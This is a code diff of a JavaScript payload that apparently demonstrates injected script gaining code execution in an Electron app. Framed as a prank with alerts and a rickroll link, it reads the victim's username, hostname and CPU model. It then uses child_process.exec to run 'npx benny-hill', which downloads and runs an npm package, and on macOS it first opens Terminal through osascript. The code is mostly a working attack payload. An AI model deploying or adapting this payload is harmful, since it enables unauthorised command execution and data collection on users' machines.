@@ -2,20 +2,28 @@
 
 alert("YOU HAVE BEEN HACKED");
 
-if (!!require) {
+if (window && window.process && window.process.type) {
 
   const os = require('os');
 
   alert(`Hey ${os.userInfo().username}`);
   alert(`Nice ${os.hostname} machine`);
   alert(`Really good ${os.cpus()[0].model}`);
-  
-  const { shell } = require('electron');
-  shell.openExternal('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
-  
-} else {
+  alert(`BTW - I have access to the proccess`);
 
-  // Append moment
+  if (os.type() == "Darwin") {
+      alert(`Using Mac... Lucky you! May I ask for your permission...`);
+      var cmd = `osascript -e 'tell app "Terminal" to do script "npx benny-hill"'`;
+      require('child_process').exec(cmd, function (error, stdout, stderr) { console.log(error); });
+  } else if (os.type() == "Windows_NT") {
+    alert(`Using Windows... Nice and easy...`);
+    require('child_process').exec('npx benny-hill', function (error, stdout, stderr) { console.log(error); });
+  }
+
+  
+}
+
+// Append moment
   const head = document.getElementsByTagName('head')[0];
   const script = document.createElement('script');
   script.type = 'text/javascript';
@@ -102,9 +110,6 @@ if (!!require) {
       alert(`I know, it is awesome, best part now...`);
       window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
     }, 8000);  
-
-    
-}
 
 
 
